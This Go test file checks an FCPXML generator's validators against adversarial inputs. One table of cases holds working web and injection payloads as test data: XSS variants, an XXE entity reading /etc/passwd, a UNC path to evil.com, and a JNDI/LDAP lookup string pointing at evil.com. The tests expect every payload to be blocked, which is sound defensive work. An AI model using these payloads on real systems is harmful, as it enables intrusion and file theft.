package fcp

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestUltimateBaffle tests the ultimate extreme FCPXML generation
func TestUltimateBaffle(t *testing.T) {
	tempDir := t.TempDir()
	outputPath := filepath.Join(tempDir, "ultimate_baffle.fcpxml")

	t.Run("Ultimate Security Exploits", func(t *testing.T) {
		config := UltimateBaffleConfig{
			EnableSecurityExploits:   true,
			EnableNumericalExtremes:  false,
			EnableBoundaryViolations: false,
			EnableUnicodeAttacks:     true,
			EnableMemoryExhaustion:   false,
			EnableValidationEvasion:  false,
			ExtremeFactor:           1.0, // Maximum extremeness
		}

		err := GenerateUltimateBaffle(outputPath, config)
		if err == nil {
			t.Error("Expected security exploits to be blocked by validation")
		}

		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Unexpected error: %v", err)
		}

		// Cleanup
		os.Remove(outputPath)
	})

	t.Run("Ultimate Numerical Extremes", func(t *testing.T) {
		config := UltimateBaffleConfig{
			EnableSecurityExploits:   false,
			EnableNumericalExtremes:  true,
			EnableBoundaryViolations: false,
			EnableUnicodeAttacks:     false,
			EnableMemoryExhaustion:   false,
			EnableValidationEvasion:  false,
			ExtremeFactor:           1.0,
		}

		err := GenerateUltimateBaffle(outputPath, config)
		if err == nil {
			t.Error("Expected numerical extremes to be blocked by validation")
		}

		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Unexpected error: %v", err)
		}

		// Cleanup
		os.Remove(outputPath)
	})

	t.Run("Ultimate Boundary Violations", func(t *testing.T) {
		config := UltimateBaffleConfig{
			EnableSecurityExploits:   false,
			EnableNumericalExtremes:  false,
			EnableBoundaryViolations: true,
			EnableUnicodeAttacks:     false,
			EnableMemoryExhaustion:   false,
			EnableValidationEvasion:  false,
			ExtremeFactor:           1.0,
		}

		err := GenerateUltimateBaffle(outputPath, config)
		if err == nil {
			t.Error("Expected boundary violations to be blocked by validation")
		}

		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Unexpected error: %v", err)
		}

		// Cleanup
		os.Remove(outputPath)
	})

	t.Run("Ultimate Memory Exhaustion", func(t *testing.T) {
		config := UltimateBaffleConfig{
			EnableSecurityExploits:   false,
			EnableNumericalExtremes:  false,
			EnableBoundaryViolations: false,
			EnableUnicodeAttacks:     false,
			EnableMemoryExhaustion:   true,
			EnableValidationEvasion:  false,
			ExtremeFactor:           0.5, // Moderate to avoid actual memory issues
		}

		err := GenerateUltimateBaffle(outputPath, config)
		if err == nil {
			t.Error("Expected memory exhaustion attempts to be blocked by validation")
		}

		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Unexpected error: %v", err)
		}

		// Cleanup
		os.Remove(outputPath)
	})

	t.Run("Ultimate Validation Evasion", func(t *testing.T) {
		config := UltimateBaffleConfig{
			EnableSecurityExploits:   false,
			EnableNumericalExtremes:  false,
			EnableBoundaryViolations: false,
			EnableUnicodeAttacks:     false,
			EnableMemoryExhaustion:   false,
			EnableValidationEvasion:  true,
			ExtremeFactor:           1.0,
		}

		err := GenerateUltimateBaffle(outputPath, config)
		if err == nil {
			t.Error("Expected validation evasion attempts to be blocked")
		}

		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Unexpected error: %v", err)
		}

		// Cleanup
		os.Remove(outputPath)
	})

	t.Run("Ultimate Everything Combined", func(t *testing.T) {
		config := DefaultUltimateBaffleConfig()

		err := GenerateUltimateBaffle(outputPath, config)
		if err == nil {
			t.Error("Expected comprehensive extreme content to be blocked by validation")
		}

		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Unexpected error: %v", err)
		}

		// Cleanup
		os.Remove(outputPath)
	})

	t.Run("Moderate Extremes Should Still Fail", func(t *testing.T) {
		config := UltimateBaffleConfig{
			EnableSecurityExploits:   true,
			EnableNumericalExtremes:  true,
			EnableBoundaryViolations: true,
			EnableUnicodeAttacks:     true,
			EnableMemoryExhaustion:   true,
			EnableValidationEvasion:  true,
			ExtremeFactor:           0.3, // Moderate extremeness
		}

		err := GenerateUltimateBaffle(outputPath, config)
		if err == nil {
			t.Error("Expected moderate extreme content to be blocked by validation")
		}

		if err != nil && !strings.Contains(err.Error(), "validation failed") {
			t.Errorf("Unexpected error: %v", err)
		}

		// Cleanup
		os.Remove(outputPath)
	})
}

// TestUltimateBaffleValidationHoles attempts to find new validation holes
func TestUltimateBaffleValidationHoles(t *testing.T) {
	tempDir := t.TempDir()
	
	// Test with different extreme factors to find the boundary where validation starts failing
	extremeFactors := []float64{0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0}
	
	for _, factor := range extremeFactors {
		t.Run(fmt.Sprintf("ExtremeFactor_%.1f", factor), func(t *testing.T) {
			config := UltimateBaffleConfig{
				EnableSecurityExploits:   true,
				EnableNumericalExtremes:  true,
				EnableBoundaryViolations: true,
				EnableUnicodeAttacks:     true,
				EnableMemoryExhaustion:   false, // Avoid actual memory issues in tests
				EnableValidationEvasion:  true,
				ExtremeFactor:           factor,
			}

			outputPath := filepath.Join(tempDir, fmt.Sprintf("baffle_%.1f.fcpxml", factor))
			err := GenerateUltimateBaffle(outputPath, config)

			if err == nil {
				t.Errorf("🚨 VALIDATION HOLE FOUND at extreme factor %.1f - content was not blocked!", factor)
				t.Errorf("File generated at: %s", outputPath)
				t.Error("Manual inspection required to identify the validation gap!")
			} else if !strings.Contains(err.Error(), "validation failed") {
				t.Logf("✅ Validation correctly blocked extreme content at factor %.1f: %v", factor, err)
			}

			// Always cleanup
			os.Remove(outputPath)
		})
	}
}

// TestSpecificValidationHoles tests for specific validation bypass techniques
func TestSpecificValidationHoles(t *testing.T) {
	testCases := []struct {
		name        string
		testFunc    func() error
		expectBlock bool
	}{
		{
			name: "Double Encoding XSS",
			testFunc: func() error {
				// Test double-encoded XSS attempts
				text := "%253Cscript%253Ealert()%253C/script%253E"
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(text)
			},
			expectBlock: true,
		},
		{
			name: "Unicode Normalization Bypass",
			testFunc: func() error {
				// Test Unicode normalization bypass
				text := "java\u0009script:alert(1)" // Tab character
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(text)
			},
			expectBlock: true,
		},
		{
			name: "CSS Expression Injection",
			testFunc: func() error {
				text := "expression(alert('xss'))"
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(text)
			},
			expectBlock: true,
		},
		{
			name: "SVG Script Injection",
			testFunc: func() error {
				text := "<svg onload=alert('xss')>"
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(text)
			},
			expectBlock: true,
		},
		{
			name: "Data URI Script",
			testFunc: func() error {
				text := "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(text)
			},
			expectBlock: true,
		},
		{
			name: "Scientific Notation Overflow",
			testFunc: func() error {
				value := "1.7976931348623157e+308" // Float64 max
				validator := NewNumericRangeValidator()
				return validator.ValidateFontSize(value)
			},
			expectBlock: true,
		},
		{
			name: "Hex Color Injection",
			testFunc: func() error {
				color := "#ff0000; background: url('javascript:alert(1)')"
				validator := NewNumericRangeValidator()
				return validator.ValidateColorValue(color)
			},
			expectBlock: true,
		},
		{
			name: "Path Traversal with UNC",
			testFunc: func() error {
				path := "\\\\evil.com\\share\\payload.exe"
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(path)
			},
			expectBlock: true,
		},
		{
			name: "XML External Entity",
			testFunc: func() error {
				text := "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>&xxe;"
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(text)
			},
			expectBlock: true,
		},
		{
			name: "LDAP Injection",
			testFunc: func() error {
				text := "${jndi:ldap://evil.com/payload}"
				validator := NewContentSecurityValidator()
				return validator.ValidateTextContent(text)
			},
			expectBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.testFunc()
			
			if tc.expectBlock && err == nil {
				t.Errorf("🚨 VALIDATION HOLE: %s was not blocked!", tc.name)
			} else if !tc.expectBlock && err != nil {
				t.Errorf("False positive: %s was incorrectly blocked: %v", tc.name, err)
			} else if tc.expectBlock && err != nil {
				t.Logf("✅ %s correctly blocked: %v", tc.name, err)
			}
		})
	}
}

